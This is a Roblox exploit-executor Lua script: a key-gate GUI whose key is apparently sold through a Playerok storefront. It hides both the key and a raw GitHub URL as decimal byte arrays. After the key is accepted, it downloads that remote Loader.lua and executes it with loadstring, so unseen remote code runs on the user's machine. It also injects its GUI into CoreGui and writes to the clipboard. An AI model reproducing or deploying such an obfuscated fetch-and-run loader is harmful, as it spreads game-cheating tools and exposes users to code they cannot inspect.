local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

-- Удаляем старый GUI
local oldGui = game:GetService("CoreGui"):FindFirstChild("PlayerokKeyGui")
if oldGui then oldGui:Destroy() end

-- Ключ: "Playerok MILEDI STORE"
local keyData = {80,108,97,121,101,114,111,107,32,77,73,76,69,68,73,32,83,84,79,82,69}
local function decodeKey(tbl)
	local s = ""
	for _, v in ipairs(tbl) do s = s .. string.char(v) end
	return s
end
local validKey = decodeKey(keyData)

-- Зашифрованный URL скрипта
local urlData = {
	104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
	101,114,99,111,110,116,101,110,116,46,99,111,109,47,68,121,110,97,70,101,
	116,99,104,121,47,83,99,114,105,112,116,115,47,114,101,102,115,47,104,101,
	97,100,115,47,109,97,105,110,47,76,111,97,100,101,114,46,108,117,97
}
local function decodeURL(tbl)
	local s = ""
	for _, v in ipairs(tbl) do s = s .. string.char(v) end
	return s
end

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "PlayerokKeyGui"
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 400, 0, 220)
frame.Position = UDim2.new(0.5, 0, 0.3, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(100, 120, 255)
frame.BackgroundTransparency = 1

local grad = Instance.new("UIGradient", frame)
grad.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 120, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 200, 255)),
}
grad.Rotation = 45
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)

local shadow = Instance.new("Frame", gui)
shadow.Size = frame.Size + UDim2.new(0, 10, 0, 10)
shadow.Position = frame.Position + UDim2.new(0, 5, 0, 5)
shadow.AnchorPoint = frame.AnchorPoint
shadow.BackgroundColor3 = Color3.new(0, 0, 0)
shadow.BackgroundTransparency = 1
shadow.ZIndex = frame.ZIndex - 1
Instance.new("UICorner", shadow).CornerRadius = UDim.new(0, 20)

-- Логотип "P"
local logo = Instance.new("TextLabel", frame)
logo.Size = UDim2.new(0, 40, 0, 40)
logo.Position = UDim2.new(0, 10, 0, 10)
logo.BackgroundTransparency = 1
logo.Text = "P"
logo.Font = Enum.Font.GothamBlack
logo.TextSize = 36
logo.TextColor3 = Color3.fromRGB(180, 200, 255)
logo.TextStrokeColor3 = Color3.fromRGB(100, 120, 255)
logo.TextStrokeTransparency = 0

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 60)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 26
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Text = "🔐 Enter your Playerok Key"

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.8, 0, 0, 40)
box.Position = UDim2.new(0.1, 0, 0, 120)
box.PlaceholderText = "Type your key here..."
box.Font = Enum.Font.Gotham
box.TextSize = 22
box.TextColor3 = Color3.fromRGB(40, 40, 40)
box.BackgroundColor3 = Color3.fromRGB(220, 220, 255)
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 15)

local buttonSubmit = Instance.new("TextButton", frame)
buttonSubmit.Size = UDim2.new(0.35, 0, 0, 45)
buttonSubmit.Position = UDim2.new(0.1, 0, 0, 180)
buttonSubmit.BackgroundColor3 = Color3.fromRGB(180, 200, 255)
buttonSubmit.Font = Enum.Font.GothamBold
buttonSubmit.TextSize = 22
buttonSubmit.TextColor3 = Color3.fromRGB(40, 40, 40)
buttonSubmit.Text = "Submit"
Instance.new("UICorner", buttonSubmit).CornerRadius = UDim.new(0, 20)

local buttonGetKey = Instance.new("TextButton", frame)
buttonGetKey.Size = UDim2.new(0.45, 0, 0, 45)
buttonGetKey.Position = UDim2.new(0.55, 0, 0, 180)
buttonGetKey.BackgroundColor3 = Color3.fromRGB(200, 220, 255)
buttonGetKey.Font = Enum.Font.GothamBold
buttonGetKey.TextSize = 22
buttonGetKey.TextColor3 = Color3.fromRGB(40, 40, 40)
buttonGetKey.Text = "Get Key"
Instance.new("UICorner", buttonGetKey).CornerRadius = UDim.new(0, 20)

local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, 0, 0, 30)
feedback.Position = UDim2.new(0, 0, 0, 235)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.TextColor3 = Color3.fromRGB(255, 255, 255)
feedback.Font = Enum.Font.GothamBold
feedback.TextSize = 20

local successSound = Instance.new("Sound", frame)
successSound.SoundId = "rbxassetid://9118820942"
successSound.Volume = 0.7

local failSound = Instance.new("Sound", frame)
failSound.SoundId = "rbxassetid://138186576"
failSound.Volume = 0.7

-- Анимация GUI
TweenService:Create(frame, TweenInfo.new(0.6), {BackgroundTransparency = 0, Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
TweenService:Create(shadow, TweenInfo.new(0.6), {BackgroundTransparency = 0, Position = UDim2.new(0.5, 5, 0.5, 5)}):Play()

-- Проверка ключа
buttonSubmit.MouseButton1Click:Connect(function()
	local input = box.Text:match("^%s*(.-)%s*$")
	if input == validKey then
		for i = 3, 1, -1 do
			feedback.Text = "✅ Success! Launching in " .. i .. "..."
			feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
			wait(1)
		end
		successSound:Play()
		gui:Destroy()
		loadstring(game:HttpGet(decodeURL(urlData)))()
	else
		feedback.Text = "❌ Invalid Key"
		feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
		failSound:Play()
		wait(2)
		feedback.Text = ""
	end
end)

-- Обновлённая кнопка Get Key
buttonGetKey.MouseButton1Click:Connect(function()
	setclipboard("https://playerok.com/profile/MILEDI-STORE/products")
	feedback.Text = "🔗 Link copied!"
	feedback.TextColor3 = Color3.fromRGB(180, 140, 20)
	wait(2)
	feedback.Text = ""
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if not gameProcessed and input.KeyCode == Enum.KeyCode.Escape then
		gui:Destroy()
	end
end)
